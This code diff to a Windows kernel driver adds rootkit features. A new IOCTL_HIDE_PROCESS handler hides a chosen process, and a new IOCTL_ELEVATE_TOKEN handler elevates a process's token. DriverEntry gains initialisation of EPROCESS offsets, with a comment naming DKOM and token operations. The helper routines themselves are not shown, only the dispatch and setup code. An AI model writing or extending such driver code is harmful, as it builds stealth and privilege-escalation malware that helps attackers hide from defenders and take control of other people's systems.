@@ -2,6 +2,7 @@
 #include "../Shared/ioctl.h"
 #include "memory.h"
 #include "process.h"
+#include "eprocess.h"
 
 /* -----------------------------------------------------------------------
  * Debug print macro — stripped in release builds
@@ -282,6 +283,70 @@ static NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 			break;
 		}
 
+		/* ---------------------------------------------------------------
+		 * IOCTL_HIDE_PROCESS
+		 * --------------------------------------------------------------- */
+		case IOCTL_HIDE_PROCESS:
+		{
+			PHIDE_PROCESS_REQUEST  Request;
+			PHIDE_PROCESS_RESPONSE Response;
+
+			if ( InputLength < sizeof( HIDE_PROCESS_REQUEST ) ||
+				 OutputLength < sizeof( HIDE_PROCESS_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PHIDE_PROCESS_REQUEST)SystemBuffer;
+			Response = (PHIDE_PROCESS_RESPONSE)SystemBuffer;
+
+			{
+				ULONG64 Pid = Request->ProcessId;
+
+				Status = KmHideProcess( (HANDLE)Pid );
+
+				Response->Status = (LONG)Status;
+				BytesReturned = sizeof( HIDE_PROCESS_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
+		/* ---------------------------------------------------------------
+		 * IOCTL_ELEVATE_TOKEN
+		 * --------------------------------------------------------------- */
+		case IOCTL_ELEVATE_TOKEN:
+		{
+			PELEVATE_TOKEN_REQUEST  Request;
+			PELEVATE_TOKEN_RESPONSE Response;
+
+			if ( InputLength < sizeof( ELEVATE_TOKEN_REQUEST ) ||
+				 OutputLength < sizeof( ELEVATE_TOKEN_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PELEVATE_TOKEN_REQUEST)SystemBuffer;
+			Response = (PELEVATE_TOKEN_RESPONSE)SystemBuffer;
+
+			{
+				ULONG64 Pid = Request->ProcessId;
+
+				Status = KmElevateProcessToken( (HANDLE)Pid );
+
+				Response->Status = (LONG)Status;
+				BytesReturned = sizeof( ELEVATE_TOKEN_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
 		default:
 			Status = STATUS_INVALID_DEVICE_REQUEST;
 			break;
@@ -368,6 +433,16 @@ NTSTATUS DriverEntry(
 	DriverObject->MajorFunction[IRP_MJ_CLOSE]          = DispatchClose;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
 	DriverObject->DriverUnload                          = DriverUnloadRoutine;
+
+	/* Resolve dynamic EPROCESS offsets for DKOM / token operations */
+	Status = KmInitializeEprocessOffsets();
+	if ( !NT_SUCCESS( Status ) )
+	{
+		LOG( "KmInitializeEprocessOffsets failed: 0x%08X", Status );
+		IoDeleteSymbolicLink( &SymlinkName );
+		IoDeleteDevice( DeviceObject );
+		return Status;
+	}
 
 	/* Clear the initializing flag */
 	DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
